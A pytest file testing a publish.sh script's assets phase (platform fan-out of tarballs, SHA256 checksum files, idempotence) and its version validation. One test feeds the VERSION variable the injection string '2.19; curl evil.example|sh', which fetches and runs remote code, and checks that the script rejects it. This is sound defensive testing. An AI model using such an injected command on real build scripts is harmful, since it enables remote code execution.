"""Filesystem tests for publish.sh assets phase (spec §7.1 fan-out + checksums).

The upload/release phases need GitHub and are exercised end-to-end against a
real tool repo; assets is pure local filesystem logic.
"""
import hashlib
import pathlib
import subprocess

REPO = pathlib.Path(__file__).resolve().parent.parent
SCRIPT = REPO / "scripts" / "publish.sh"


def make_tarball(dist: pathlib.Path, name: str, payload: bytes = b"payload") -> pathlib.Path:
    import tarfile, io, os
    dist.mkdir(parents=True, exist_ok=True)
    f = dist / name
    # real .tar.gz so sha256 over bytes is meaningful
    with tarfile.open(f, "w:gz") as tf:
        info = tarfile.TarInfo("pkg/data.bin")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))
    return f


def sha(path: pathlib.Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def run(dist: pathlib.Path, platform_independent: bool):
    import os
    env = dict(os.environ, PLATFORM_INDEPENDENT="true" if platform_independent else "false",
               DIST=str(dist))
    env.pop("TOOL", None); env.pop("VERSION", None)   # assets phase needs neither
    return subprocess.run(["bash", str(SCRIPT), "assets"], env=env,
                          capture_output=True, text=True)


def test_assets_fans_out_noarch_to_three_platforms(tmp_path):
    dist = tmp_path / "dist"
    original = make_tarball(dist, "kickc-0.8.6-noarch.tar.gz")
    before = sha(original)
    r = run(dist, platform_independent=True)
    assert r.returncode == 0, r.stderr
    assert not (dist / "kickc-0.8.6-noarch.tar.gz").exists(), "noarch name must not ship"
    for p in ("linux-x86_64", "linux-aarch64", "macos-aarch64"):
        out = dist / f"kickc-0.8.6-{p}.tar.gz"
        assert out.exists(), f"missing {p} asset"
        assert sha(out) == before, "platform assets must be identical bytes (§7.1)"
    sums = dist / "SHA256SUMS"
    assert sums.exists()
    assert len(sums.read_text().splitlines()) == 3
    assert (dist / "kickc-0.8.6-linux-x86_64.tar.gz.sha256").exists()
    # per-asset .sha256 must verify
    content = (dist / "kickc-0.8.6-linux-x86_64.tar.gz.sha256").read_text().split()
    assert content[0] == sha(dist / "kickc-0.8.6-linux-x86_64.tar.gz")


def test_assets_platform_specific_keeps_names_adds_checksums(tmp_path):
    dist = tmp_path / "dist"
    make_tarball(dist, "cc65-2.19-linux-x86_64.tar.gz")
    r = run(dist, platform_independent=False)
    assert r.returncode == 0, r.stderr
    assert (dist / "cc65-2.19-linux-x86_64.tar.gz").exists()
    assert (dist / "SHA256SUMS").exists()
    assert (dist / "cc65-2.19-linux-x86_64.tar.gz.sha256").exists()
    # exactly one archive line
    assert len((dist / "SHA256SUMS").read_text().splitlines()) == 1


def test_assets_is_idempotent(tmp_path):
    dist = tmp_path / "dist"
    make_tarball(dist, "cc65-2.19-linux-x86_64.tar.gz")
    assert run(dist, False).returncode == 0
    assert run(dist, False).returncode == 0, "second run must not duplicate checksums"
    assert len((dist / "SHA256SUMS").read_text().splitlines()) == 1

def test_upload_and_release_reject_malformed_version_before_any_gh_call(tmp_path):
    # A crafted VERSION reaches jq programs and release ids — validate at the
    # door (security review). PATH contains only grep, so any gh invocation
    # would fail with 127; the guard must fire first with a clear error.
    import os, shutil, tempfile
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "bash").symlink_to(shutil.which("bash"))
    (bindir / "grep").symlink_to(shutil.which("grep"))
    for phase in ("upload", "release"):
        env = {
            "PATH": str(bindir),
            "GITHUB_REPOSITORY": "retropack/x",
            "VERSION": "2.19; curl evil.example|sh",
            "GH_TOKEN": "x",
            "DIST": str(tmp_path / "dist"),
        }
        r = subprocess.run(["bash", str(SCRIPT), phase], env=env,
                           capture_output=True, text=True)
        assert r.returncode == 1, f"{phase}: rc={r.returncode}, stderr={r.stderr}"
        assert "invalid version" in r.stderr, r.stderr
